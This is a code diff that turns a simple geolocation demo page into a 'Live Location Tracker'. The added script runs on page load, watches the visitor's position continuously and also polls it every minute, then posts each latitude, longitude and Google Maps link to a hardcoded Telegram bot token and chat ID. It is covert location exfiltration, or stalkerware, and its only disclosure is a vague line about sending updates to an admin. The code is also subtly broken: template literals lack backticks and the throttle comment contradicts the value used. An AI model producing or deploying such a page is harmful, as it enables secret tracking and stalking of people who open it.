@@ -1,44 +1,72 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Location Tracker</title>
-    <script>
-        function getLocation() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(showPosition, showError);
-            } else {
-                document.getElementById("location").innerHTML = "Geolocation is not supported by this browser.";
-            }
-        }
-
-        function showPosition(position) {
-            const lat = position.coords.latitude;
-            const lon = position.coords.longitude;
-            document.getElementById("location").innerHTML = "Latitude: " + lat + "<br>Longitude: " + lon;
-        }
-
-        function showError(error) {
-            switch(error.code) {
-                case error.PERMISSION_DENIED:
-                    document.getElementById("location").innerHTML = "User denied the request for Geolocation.";
-                    break;
-                case error.POSITION_UNAVAILABLE:
-                    document.getElementById("location").innerHTML = "Location information is unavailable.";
-                    break;
-                case error.TIMEOUT:
-                    document.getElementById("location").innerHTML = "The request to get user location timed out.";
-                    break;
-                case error.UNKNOWN_ERROR:
-                    document.getElementById("location").innerHTML = "An unknown error occurred.";
-                    break;
-            }
-        }
-    </script>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Live Location Tracker</title>
 </head>
-<body onload="getLocation()">
-    <h1>Your Location</h1>
-    <p id="location">Fetching location...</p>
+<body>
+  <h2>Tracking your location...</h2>
+  <p>This site is requesting location access to send updates to admin.</p>
+
+  <script>
+    const botToken = '7120973962:AAGAg--wtFTo3Jv03WbiC3-iqkKZ-lM9NN4';
+    const chatId = '6813758444';
+
+    let lastSentTime = 0;
+
+    function sendToTelegram(lat, lon) {
+      const now = Date.now();
+      const message = Live Location:\nLatitude: ${lat}\nLongitude: ${lon}\nhttps://maps.google.com/?q=${lat},${lon};
+
+      // Prevent spamming the bot (send only if 30s passed)
+      if (now - lastSentTime > 10000) {
+        lastSentTime = now;
+
+        fetch(https://api.telegram.org/bot${botToken}/sendMessage, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: message
+          })
+        }).then(() => console.log('Location sent:', lat, lon))
+          .catch(err => console.error('Telegram error:', err));
+      }
+    }
+
+    function startTracking() {
+      if (!navigator.geolocation) {
+        alert("Geolocation is not supported by your browser.");
+        return;
+      }
+
+      // Real-time tracking (every movement)
+      navigator.geolocation.watchPosition(
+        (position) => {
+          const { latitude, longitude } = position.coords;
+          sendToTelegram(latitude, longitude);
+        },
+        (err) => {
+          alert("Permission denied or location unavailable.");
+          console.error(err);
+        },
+        { enableHighAccuracy: true, maximumAge: 10000 }
+      );
+
+      // Periodic tracking (every 1 minute)
+      setInterval(() => {
+        navigator.geolocation.getCurrentPosition(
+          (position) => {
+            const { latitude, longitude } = position.coords;
+            sendToTelegram(latitude, longitude);
+          },
+          (err) => console.error("Interval tracking error:", err)
+        );
+      }, 60000); // 60,000ms = 1 minute
+    }
+
+    startTracking();
+  </script>
 </body>
 </html>
